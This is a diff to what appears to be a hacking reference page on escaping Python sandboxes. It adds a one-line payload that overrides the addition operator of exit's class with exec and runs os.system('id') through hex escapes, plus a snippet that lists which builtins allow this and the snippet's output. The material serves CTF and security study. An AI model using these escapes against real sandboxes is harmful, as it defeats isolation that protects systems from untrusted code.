@@ -34,12 +34,32 @@ class _:pass
 **Note**: In the string, you can encode any other characters it doesn't accept by using `\x` hex escapes
 {% endhint %}
 
-And another completely different way using method overriding:
+And another completely different way using method overriding, which can even be put on a single line:
 
 ```python
-exit.__class__.__add__ = exec
-exit + "import os; os.system\x28'id'\x29"
+exit.__class__.__add__ = exec; exit + "import os; os.system\x28'id'\x29"
 ```
+
+The above method works because we overwrite the regular addition operator for the `exec()` function object. In most built-in functions, this is not allowed and you will get a `can't set attributes of built-in/extension` error. But not all built-in functions are protected like this, and a few classes exist that still allow you to overwrite their methods. You can find them all with this snippet:
+
+<pre class="language-python"><code class="lang-python">for key, value in __builtins__.__dict__.items():
+    try:
+<strong>        value.__class__.__add__ = exec
+</strong><strong>        print(key, value.__class__)
+</strong>    except TypeError:
+        pass
+</code></pre>
+
+It will print all the possible functions that allow method overriding:
+
+<pre class="language-python"><code class="lang-python">__spec__  &#x3C;class '_frozen_importlib.ModuleSpec'>
+quit      &#x3C;class '_sitebuiltins.Quitter'>
+<strong>exit      &#x3C;class '_sitebuiltins.Quitter'>
+</strong>copyright &#x3C;class '_sitebuiltins._Printer'>
+credits   &#x3C;class '_sitebuiltins._Printer'>
+license   &#x3C;class '_sitebuiltins._Printer'>
+help      &#x3C;class '_sitebuiltins._Helper'>
+</code></pre>
 
 ### Strings without quotes
 
